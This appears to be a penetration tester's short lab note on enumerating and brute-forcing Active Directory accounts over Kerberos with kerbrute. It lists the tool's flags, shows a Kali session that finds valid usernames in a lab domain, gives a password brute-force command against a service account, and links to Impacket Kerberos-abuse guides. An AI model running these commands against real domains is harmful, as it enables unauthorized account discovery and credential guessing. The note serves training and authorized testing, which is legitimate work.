# User Enumeration
Port: 88
https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/
```sh
Global Flags:
      --dc string       The location of the Domain Controller(KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors
```


```sh
┌──(root㉿kali)-[~/go/bin]
└─ kerbrute userenum -d spookysec.local --dc 10.10.20.128 /usr/share/seclists/Usernames/Names/names.txt
2023/07/10 20:00:01 >  Using KDC(s):
2023/07/10 20:00:01 >   10.10.20.128:88

2023/07/10 20:00:02 >  [+] VALID USERNAME:       james@spookysec.local
2023/07/10 20:00:04 >  [+] VALID USERNAME:       svc-admin@spookysec.local

# Bruteforce Username
kerbrute bruteuser --dc 10.10.20.128 -d spookysec.local pass.txt svc-admin
```

# Abuse Kerberos with [[Impacket]]
https://www.hackingarticles.in/abusing-kerberos-using-impacket/